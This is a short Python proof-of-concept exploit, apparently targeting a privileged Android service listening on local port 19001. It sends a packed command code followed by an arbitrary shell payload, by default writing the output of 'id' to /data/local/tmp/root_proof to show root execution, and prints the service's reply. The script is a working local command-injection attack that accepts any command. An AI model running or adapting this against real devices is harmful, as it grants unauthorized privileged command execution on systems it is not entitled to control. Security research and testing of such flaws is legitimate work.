import socket, struct, sys, time

cmd = int(sys.argv[1]) if len(sys.argv) > 1 else 4
payload = sys.argv[2].encode() if len(sys.argv) > 2 else b"id > /data/local/tmp/root_proof 2>&1"
payload = payload[:255]
buf = struct.pack("<I", cmd) + payload.ljust(256, b"\0")

s = socket.create_connection(("127.0.0.1", 19001), timeout=3)
s.sendall(buf)
s.settimeout(3)
try:
    data = s.recv(4096)
    print("recv", len(data), data.hex(), repr(data[:200]))
except Exception as e:
    print("recv error:", e)
s.close()
